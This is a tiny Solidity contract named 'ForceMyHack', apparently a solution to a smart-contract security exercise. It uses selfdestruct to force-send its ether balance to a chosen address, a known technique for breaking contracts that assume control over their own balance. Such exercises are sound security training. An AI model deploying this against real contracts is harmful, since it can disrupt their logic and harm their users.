// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

contract ForceMyHack {

    function sendEther(address payable _to) public payable {
        selfdestruct(_to);
    }

}